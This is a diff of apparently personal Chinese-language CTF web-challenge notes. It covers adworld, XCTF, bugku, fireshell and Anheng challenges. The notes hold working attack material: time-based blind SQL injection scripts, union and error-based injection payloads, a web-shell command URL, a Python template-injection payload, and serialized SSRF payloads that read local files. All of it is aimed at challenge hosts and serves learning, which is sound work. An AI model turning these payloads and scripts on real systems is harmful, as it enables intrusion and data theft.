@@ -200,13 +200,10 @@
 	}  
 ?>
 	这个题遇到很多骚办法，暂时还不会做
-	博客 ：https://blog.csdn.net/csu_vc/article/details/78375203
-		   https://blog.csdn.net/yh1013024906/article/details/81087939
-	php 伪协议
-	php://filter
-	php://input
+	https://www.leavesongs.com/PENETRATION/php-filter-magic.html
+	php 伪协议	php://filter	php://input
 	// ROIS恰好也有这道题，暗示我多做题？？
-	// 构造序列化，注意类名Read
+	// 构造序列化，注意类名 Read
 	<?php
 		class Read{
 			public $file;
@@ -1285,11 +1282,11 @@
 		// 得到可能的种子 3281694990 3281694991 981279433
 
 		/*
-zip://uP1O4Ds/xlKZUYfp47Dl1cHKvGz84VIY64sIItpF_test.png%23test&a=phpinfo();
-zip://uP1O4Ds/uISoLxXH6C3FBakm7buwAMVQGR3zwRoG_test.png%23test&a=phpinfo();
-zip://uP1O4Ds/HNugRX9Vq7I2o9Tq67KrDbERlYpMjZGp_test.png%23test&a=phpinfo();
-zip://uP1O4Ds/HQQ6DPmMEyttuA9AB5bic3MzOfOTKSa4_test.png%23test&a=phpinfo();
-zip://uP1O4Ds/H4zDu3QZU6pbeFFLl8ax8TKMDwusUQfu_test.png%23test&a=phpinfo();
+		zip://uP1O4Ds/xlKZUYfp47Dl1cHKvGz84VIY64sIItpF_test.png%23test&a=phpinfo();
+		zip://uP1O4Ds/uISoLxXH6C3FBakm7buwAMVQGR3zwRoG_test.png%23test&a=phpinfo();
+		zip://uP1O4Ds/HNugRX9Vq7I2o9Tq67KrDbERlYpMjZGp_test.png%23test&a=phpinfo();
+		zip://uP1O4Ds/HQQ6DPmMEyttuA9AB5bic3MzOfOTKSa4_test.png%23test&a=phpinfo();
+		zip://uP1O4Ds/H4zDu3QZU6pbeFFLl8ax8TKMDwusUQfu_test.png%23test&a=phpinfo();
 
 		*/
 
@@ -1328,32 +1325,32 @@ zip://uP1O4Ds/H4zDu3QZU6pbeFFLl8ax8TKMDwusUQfu_test.png%23test&a=phpinfo();
 
 
 	index.php
-<?php
-error_reporting(0);
+	<?php
+	error_reporting(0);
 
-session_start();
-if(isset($_GET['page'])){
-	$page=$_GET['page'];
-}else{
-	$page=null;
-}
-
-if(preg_match('/\.\./',$page)) {
-	echo "<div class=\"msg error\" id=\"message\">
-	<i class=\"fa fa-exclamation-triangle\"></i>Attack Detected!</div>";
-	die();
-}
-?>
-
-<?php
-if($page) {
-	if(!(include($page.'.php'))) {
-		echo "<div class=\"msg error\" id=\"message\">
-	<i class=\"fa fa-exclamation-triangle\"></i>error!</div>";
-		exit;
+	session_start();
+	if(isset($_GET['page'])){
+		$page=$_GET['page'];
+	}else{
+		$page=null;
 	}
-}
-?>
+
+	if(preg_match('/\.\./',$page)) {
+		echo "<div class=\"msg error\" id=\"message\">
+		<i class=\"fa fa-exclamation-triangle\"></i>Attack Detected!</div>";
+		die();
+	}
+	?>
+
+	<?php
+	if($page) {
+		if(!(include($page.'.php'))) {
+			echo "<div class=\"msg error\" id=\"message\">
+		<i class=\"fa fa-exclamation-triangle\"></i>error!</div>";
+			exit;
+		}
+	}
+	?>
 
 	爆破随机数种子(session_id为我们的 PHPSESSID，hash为SESSI0N)
 	ini_set(‘max_execution_time’, ‘0’);  // 设置运行时间无限
@@ -1450,6 +1447,14 @@ if($page) {
 
 	usr=111' union select 1, name FROM users limit 0,1 --&pw=f
 	admin	3fab54a50e770d830c0416df817567662a9dc85c	my+fav+word+in+my+fav+paper
+
+	将网站上的所有 pdf 下载下来，我们这里用 wget 递归下载：wget xxx.com -r -np -nd -A .pdf
+
+	-r：层叠递归处理
+	-np：不向上（url 路径）递归
+	-nd：不创建和 web 网站相同（url 路径）的目录结构
+	-A type：文件类型
+
 
 	参考 https://chybeta.github.io/2017/10/22/Hack-lu-CTF-2017-Flatscience-writeup/
 	暴力py脚本
@@ -1683,3 +1688,482 @@ if($page) {
 	header = {"Cookie":"JSESSION=%s" % jsession.replace("=","%3D")}
 	r = requests.post(url, headers=header)
 	print r.text
+
+
+# adworld upload
+	前端验证，直接抓包改名绕过
+	直接给出了目录，system($_GET['cmd'])，antsword连接，连接不上，可能是docker很多命令都没安装
+	再试试eval，系统命令没有，PHP的总是可以把，用了下 scandir('../')，发现有 flag.php，现在的任务就是读取flag.php，
+	file_get_contents("../flag.php")居然没反应，灵机一动 highlight_file() 成功了
+	http://111.198.29.45:32032/upload/1548320743.2.php?cmd=highlight_file("../flag.php");
+
+
+# XCTF 4th-QCTF-2018 Confusion1
+	题目描述：
+	One day, Bob said “PHP is the best language!”, but Alice didn’t agree it, so Alice write a website to proof it. 
+	She published it before finish it but I find something WRONG at some page.(Please DO NOT use scanner!)
+	<!--Flag @ /opt/flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt-->
+	<!--Salt @ /opt/salt_b420e8cfb8862548e68459ae1d37a1d5.txt-->
+	http://111.198.29.45:32058/%7B%7B''['__cla'+'ss__']['__mr'+'o__'][2]['__subcla'+'sses__']()[40]('opt/flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt').next()%7D%7D
+	python 模板注入
+	https://www.freebuf.com/column/177864.html
+	https://portswigger.net/blog/server-side-template-injection
+	https://hwhxy.github.io/ctf/2018/07/26/%E4%BB%8ECTF%E4%B8%AD%E5%AD%A6%E4%B9%A0%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8/
+
+
+# XCTF 4th-CyberEarth 签到题
+	题目描述：云平台报表中心收集了设备管理基础服务的数据，但是数据被删除了，只有一处留下了入侵者的痕迹。
+	看到送分题就尴尬了一下，试了下SQL注入，全跳转到id=1，id=2没反应，看下wp，没想到是爆破到id=2333，需要脑洞啊
+	wp：https://www.secpulse.com/archives/67980.html https://www.secfree.com/article/695.html
+	官方wp太辣眼睛
+
+
+# XCTF 4th-CyberEarth ics-01
+	<?php
+	error_reporting(0);
+	ini_set('open_basedir', '/var/www/html');
+	
+	function autoload($page) {
+		if (stripos($_SERVER['QUERY_STRING'], 'flag') > 0) {
+			die('no flag flag flag flag !');
+		}
+	
+		if (stripos($_SERVER['QUERY_STRING'], 'uploaded') > 0) {
+			die('no uploaded uploaded uploaded uploaded !');
+		}
+	
+		if (stripos($_SERVER['QUERY_STRING'], '://f') > 0) {
+			die('no ://f ://f ://f');
+		}
+	
+		if (stripos($_SERVER['QUERY_STRING'], 'ata') > 0) {
+			die('no ata ata ata');
+		}
+	
+		if (stripos($_SERVER['QUERY_STRING'], '0') > 0) {
+			die('no 0 0 0');
+		}
+	
+		if (file_exists("./includes/$page.php")) {
+			include "./includes/$page.php";
+		} elseif (file_exists("./includes/$page")) {
+			include "./includes/$page";
+		} else {
+			echo "File is not exit ";
+		}
+	}
+	
+	
+	function download($adfile, $file) {
+		//Only Administrators can download files .
+		$cert = 'N';
+		if (isset($adfile) && file_get_contents($adfile, 'r') === 'Yeah Everything Will Be Ok My Boss') {
+			echo "Welcome ! You Are Administrator !";
+			$cert = 'Y';
+		} else {
+			echo "error1";
+		}
+		if ($cert === 'Y') {
+			if (stripos($file, 'file_list') != false) {
+				die('error4');
+			}
+			if (stripos($file, 'file_list') >= 0) {
+				header('Content-Deion: File Transfer');
+				header('Content-Type: application/octet-stream');
+				header('Content-Disposition: attachment; filename='. basename($file));
+				header('Content-Transfer-Encoding: binary');
+				header('Expires: 0');
+				header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
+				header('Pragma: public');
+				header('Content-Length: ' . filesize($file));
+				readfile($file);
+			} else {
+				die('error2');
+			}
+		} else {
+			echo 'error3';
+		}
+	}
+	
+	if (!isset($_GET['page'])) {
+		$page = 'index';
+	} else {
+		$page = $_GET['page'];
+	}
+	if (stripos($page, './') > 0) {
+		die('no ./ ./ ./ ./');
+	}
+	if (stripos($page, '://') > 0) {
+		die('no :// :// ://');
+	}
+	autoload($page);
+	
+	if (isset($_GET[admin]) && isset($_GET[file])) {
+		if (stripos($_GET[admin], 'flag') > 0 || stripos($_GET[file], 'flag') > 0) {
+			die('not flag flag flag falg !');
+		}
+	
+		if (strlen($_GET[file]) >= 38) {
+			die('too long');
+		}
+	
+		download($_GET[admin], $_GET[file]);
+	}
+
+	?admin=php://input&file=includes/upload.php
+	读到 upload.php 
+
+	<?php
+	if (stripos($_SERVER['QUERY_STRING'], 'flag') > 0) {
+		die('no flag flag flag flag !');
+	}
+
+	if (!empty($_FILES)) {
+	//properties of the uploaded file
+		$name= $_FILES["filename"]["name"];
+		$type= $_FILES["filename"]["type"];
+		$size= $_FILES["filename"]["size"];
+		$temp= $_FILES["filename"]["tmp_name"];
+		$error= $_FILES["filename"]["error"];
+
+		if (strlen($name) >= 6) {
+			die('name is too long !');
+		}
+
+		if (stripos($name, './') > 0) {
+			die('invalid parameter');
+		}
+
+		if (stripos($name, 'php') > 0) {
+			die('invalid parameter');
+		}
+
+		if (substr($name, -3, 3) !== 'zip' && substr($name, -3, 3) !== 'jpg' && substr($name, -3, 3) !== 'png') {
+			die('file can not upload ! ');
+		}
+
+		if ($error > 0) {
+			die("Error uploading file! code $error.");
+		} else {
+			if ($type !== "application/zip" || $size > 400) {//condition for the file
+				die("Format not allowed or file size too big!");
+			} else {
+				if (file_exists('includes')) {
+					move_uploaded_file($temp, "includes/uploaded/" .$name);
+					echo "Upload complete a!";
+					shell_exec('sh /var/www/html/includes/unzip.sh');
+				} elseif (file_exists('uploaded')) {
+					move_uploaded_file($temp, "uploaded/" .$name);
+					echo "Upload complete!";
+					shell_exec('sh /var/www/html/includes/unzip.sh');
+				}
+			}
+		}
+	} else {
+		if (isset($_GET['step']) && strlen($_GET['step']) === 20) {
+			if (stripos($_GET['step'], 'lag') > 0) {
+				die('error');
+			}
+
+			if (stripos($_GET['step'], './') > 0) {
+				die('error');
+			}
+
+			if (stripos($_GET['step'], ' ') > 0) {
+				die('error');
+			}
+
+			if (stripos($_GET['step'], '/') > 0) {
+				die('error');
+			}
+			if (preg_match('/[^\w\d_ -]/si', $_GET['step'])) {
+				$_GET['step'] = preg_replace('/[^a-zA-Z0-9_ -]/s', '', $_GET['step']);
+				die('error');
+			}
+			passthru('cat ' . 'uploaded/' . $_GET['step']);
+		} else {
+			die();
+		}
+	}
+
+
+
+
+
+# bugku insert into 注入题（XFF注入）
+	关键代码
+	<? php
+	function getIp() {
+		$ip = '';
+		if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+			$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
+		} else {
+			$ip = $_SERVER['REMOTE_ADDR'];
+		}
+		$ip_arr = explode(',', $ip);
+		return $ip_arr[0];
+	}
+
+	$ip = getIp();
+	echo 'your ip is :'.$ip;
+	$sql = "insert into client_ip (ip) values ('$ip')";
+	mysql_query($sql);
+
+	明显没有报错信息，没有回显，只能盲注
+	还有一点，不能用逗号
+	先手注得出数据库名和字段名，优先跑flag中的flag，再写脚本跑
+
+	import requests
+	import sys
+	# 基于时间的盲注，过滤了逗号，使用 from x for 1 代替 x, 1
+	sql = "127.0.0.1'+(select case when substr((select flag from flag) from {0} for 1)='{1}' then sleep(5) else 0 end))-- +"
+	url = "http://123.206.87.240:8002/web15/"
+	flag = ''
+	for i in range(1, 40):
+		print('正在猜测：', str(i))
+		for ch in range(32, 129):
+			if ch == 128:
+				sys.exit(0)
+			sqli = sql.format(i, chr(ch))
+			# print(sqli)
+			header = {
+				'X-Forwarded-For': sqli
+			}
+			try:
+				html = requests.get(url, headers=header, timeout=3)
+			except:
+				flag += chr(ch)
+				print(flag)
+				break
+
+	# 打算改成二分，结果失败了，以后补
+	import requests
+	url = "http://123.206.87.240:8002/web15/"
+	sql = "127.0.0.1'+(select case when substr((select flag from flag) from {0} for 1)>'{1}' then sleep(3) else 0 end))-- +"
+	flag = ''
+	for i in range(1, 40):
+		print('正在猜测：', str(i))
+		left = 31
+		right = 129
+		while left < right:
+			mid = (left+right)//2
+			temp = right
+			sqli = sql.format(i, chr(mid))
+			header = {
+				'X-Forwarded-For': sqli
+			}
+			try:
+				html = requests.get(url, headers=header, timeout=2)
+				right = mid - 1
+			except:
+				left = mid
+				right = temp
+		flag += chr(left)
+		print(flag)
+
+
+# bugku 多次
+	and 被替换，anandd 绕过
+	数据库名长度为 9，名称 WEB1002-1
+	|| length("and")=3  以此检测 and 是否被过滤
+	或者 id = 1 ^ (length("and")=3)
+	http://123.206.87.240:9004/1ndex.php
+	order 被过滤，尝试 ordorderer，不行，因为 or 被过滤，还得双写 or，oorrder就可以了
+	order by 2 正常，得出只查询两个字段
+	ununionion seleselectct 1, 2%23 得到回显 2
+	剩下就是常规套路，这里其实可以写 tamper 然后用 sqlmap 跑一下
+	也可以盲注跑出数据库名，或者直接从 information_schema 得到数据
+	?id=-1' ununionion seleselectct 1,group_concat(table_name) from infoorrmation_schema.tables where table_schema=database()%23
+	注意 or 被过滤 得到 flag1，hint
+	先查看 flag1 的内容
+	?id=-1' ununionion seleselectct 1,group_concat(column_name) from infoorrmation_schema.columns where table_name=0x666c616731%23
+	得到 flag1、address
+	?id=-1' ununionion seleselectct 1,flag1 from flag1%23
+	得到 usOwycTju+FTUUzXosjr  
+	?id=-1' ununionion seleselectct 1,address from flag1%23
+	得到下一关地址
+	进入下一关后，有明显的报错信息，尝试报错注入
+	?id=0' and (extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e)));%23
+	得到 XPATH syntax error: '~class,flag2~'
+	?id=0' and (extractvalue(1,concat(0x7e,(select flag2 from flag2),0x7e)));%23
+	得到了一个假flag：flag{Bugku-sql_6s-2i-4t-bug}
+	把 B 换成 b 就行了 ^==^
+
+
+# bugku sql注入2
+	御剑和脚本啥都没扫出来
+	nikto -host http://123.206.87.240:8007/web2/
+	OSVDB-6694: /web2/.DS_Store: Apache on Mac OSX will serve the .DS_Store file, which contains sensitive information. Configure Apache to ignore this file or upgrade to a newer version.
+	.DS_Store file // 再用脚本跑出目录
+
+
+# Hack.lu-2017 Triangle
+	结合 js 的逆向题
+	wp:https://st98.github.io/diary/posts/2017-10-25-hacklu-ctf-2017.html
+
+
+# fireshell 2019 Vice 
+	<?php
+	//require_once 'config.php';
+
+	class SHITS{
+		private $url;
+		private $method;
+		private $addr;
+		private $host;
+		private $name;
+
+		function __construct($method,$url){
+			$this->method = $method;
+			$this->url = $url;
+		}
+
+		function doit(){
+			
+			$this->host = @parse_url($this->url)['host'];
+			$this->addr = @gethostbyname($this->host);
+			$this->name = @gethostbyaddr($this->host);
+			if($this->addr !== "127.0.0.1" || $this->name === false){
+			$not = ['.txt','.php','.xml','.html','.','[',']'];
+			foreach($not as $ext){
+				$p = strpos($this->url,$ext);
+				if($p){
+					die(":)");
+				}
+			}
+			$ch = curl_init();
+			curl_setopt($ch,CURLOPT_URL,$this->url);
+			curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
+
+			$result = curl_exec($ch);
+			echo $result;
+			}else{
+			die(":)");
+			}
+		}
+		function __destruct(){
+			if(in_array($this->method,array("doit"))){
+		
+			call_user_func_array(array($this,$this->method),array());
+			}else{
+			die(":)");
+			}
+		}
+	}
+	if(isset($_GET["gg"])) {
+		@unserialize($_GET["gg"]);
+	} else {
+		highlight_file(__FILE__);
+	}
+
+	打开 config.php ， awn...
+	猜想 config.php 有访问限制，构造 ssrf 访问，然而还是啥都没有
+
+	$not = ['.txt','.php','.xml','.html','.','[',']'];
+	foreach($not as $ext){
+		$p = strpos($this->url,$ext);
+		if($p){
+			die(":)");
+		}
+	}
+
+	此处可构造
+	$gg = new SHITS('doit', '.php@68.183.31.62:991/config.php');
+	$gg = new SHITS('doit', '.php@localhost/config.php');
+	$gg = new SHITS('doit', 'localhost/config%2ephp');
+	参考：https://www.secpulse.com/archives/65832.html
+	$ser = serialize($gg);
+	echo urlencode($ser) ."<br>";
+	unserialize($ser);
+
+	O%3A5%3A%22SHITS%22%3A5%3A%7Bs%3A10%3A%22%00SHITS%00url%22%3Bs%3A32%3A%22.php%4068.183.31.62%3A991%2Fconfig.php%22%3Bs%3A13%3A%22%00SHITS%00method%22%3Bs%3A4%3A%22doit%22%3Bs%3A11%3A%22%00SHITS%00addr%22%3BN%3Bs%3A11%3A%22%00SHITS%00host%22%3BN%3Bs%3A11%3A%22%00SHITS%00name%22%3BN%3B%7D
+	先编码，序列化后直接反序列化，此过程由于特殊符号编码会引起混乱，出现 unserialize(): Error at offset 错误
+	也可以进行 base64 编码，但是需要改代码，这里利用 web 特性，url编码最方便
+
+	但是并没有什么卵用
+
+	还是得 file:///var/www/html/config%2ephp 二次编码绕过 . 
+	读取 config.php O%3A5%3A%22SHITS%22%3A5%3A%7Bs%3A10%3A%22%00SHITS%00url%22%3Bs%3A33%3A%22file%3A%2F%2F%2Fvar%2Fwww%2Fhtml%2Fconfig%252ephp%22%3Bs%3A13%3A%22%00SHITS%00method%22%3Bs%3A4%3A%22doit%22%3Bs%3A11%3A%22%00SHITS%00addr%22%3BN%3Bs%3A11%3A%22%00SHITS%00host%22%3BN%3Bs%3A11%3A%22%00SHITS%00name%22%3BN%3B%7D
+	其实可以这样，不需要所有属性，只要前两个 O%3A5%3A%22SHITS%22%3A2%3A%7Bs%3A10%3A%22%00SHITS%00url%22%3Bs%3A33%3A%22file%3A%2F%2F%2Fvar%2Fwww%2Fhtml%2Fconfig%252ephp%22%3Bs%3A13%3A%22%00SHITS%00method%22%3
+	if($_SERVER['REMOTE_ADDR'] !== '::1' || $_SERVER['REMOTE_ADDR'] !== '127.0.0.1'){
+		echo "aaawn";
+	}else{
+		$flag ="F#{wtf_5trp0s_}";
+	}
+
+
+# tinyCTF 2014: NaNNaNNaNNaN…, Batman!
+	<script>
+	_ = 'function $(){e=getEleById("c").value;length==16^be0f23233ace98aa$c7be9){tfls_aie}na_h0lnrg{e_0iit\'_ns=[t,n,r,i];for(o=0;o<13;++o){	[0]);.splice(0,1)}}}	\'<input id="c">< onclick=$()>Ok</>\');delete _var ","docu.)match(/"];/)!=null=["	write(s[o%4]buttonif(e.ment';
+	for(Y in $='	')
+		with(_.split($[Y])) 
+			_=join(pop());
+	eval(_)
+	</script>
+	将 eval 换成 console.log(_)
+	得到
+	function $() {
+		var e = document.getElementById("c").value;
+		if (e.length == 16)
+			if (e.match(/^be0f23/) != null)
+				if (e.match(/233ac/) != null)
+					if (e.match(/e98aa$/) != null)
+						if (e.match(/c7be9/) != null) {
+							var t = ["fl", "s_a", "i", "e}"];
+							var n = ["a", "_h0l", "n"];
+							var r = ["g{", "e", "_0"];
+							var i = ["it'", "_", "n"];
+							var s = [t, n, r, i];
+							for (var o = 0; o < 13; ++o) {
+								document.write(s[o % 4][0]);
+								s[o % 4].splice(0, 1)
+							}
+						}
+	}
+	document.write('<input id="c"><button onclick=$()>Ok</button>');
+	delete _
+	直接执行中间那部分即可得到flag
+
+
+# 安恒杯一月赛
+	simple php
+	1.SQL约束攻击
+	2.tp3.2 sql注入
+	https://www.anquanke.com/post/id/170341#h3-3
+	发现是搜索框，并且是tp3.2
+	不难想到注入漏洞，随手尝试报错id
+
+	http://101.71.29.5:10004/Admin/User/Index?search[table]=flag where 1 and polygon(id)--
+	发现库名tpctf，表名flag，根据经验猜测字段名是否为flag
+
+	http://101.71.29.5:10004/Admin/User/Index?search[table]=flag where 1 and polygon(flag)--
+	nice，发现flag字段也存在，省了不少事
+	
+	下面是思考如何注入得到数据,随手测试
+
+	http://101.71.29.5:10004/Admin/User/Index?search[table]=flag where 1 and if(1,sleep(3),0)--
+
+	发现成功sleep 3s,轻松写出exp
+
+	import requests
+	flag = ''
+	cookies = {
+		'PHPSESSID': 're4g49sil8hfh4ovfrk7ln1o02'
+	}
+	for i in range(1,33):
+		for j in '0123456789abcdef':
+			url = 'http://101.71.29.5:10004/Admin/User/Index?search[table]=flag where 1 and if((ascii(substr((select flag from flag limit 0,1),'+str(i)+',1))='+str(ord(j))+'),sleep(3),0)--'
+			try:
+				r = requests.get(url=url,timeout=2.5,cookies=cookies)
+			except:
+				flag += j
+				print flag
+				break
+
+
+	tp 这几个漏洞还搞不清楚
+	https://xz.aliyun.com/t/2812#toc-11
+	https://www.anquanke.com/post/id/157817
+	https://www.secpulse.com/archives/29826.html
+	https://bbs.ichunqiu.com/thread-38901-1-1.html
+	先缓缓吧，phpstudy里已经搭好环境
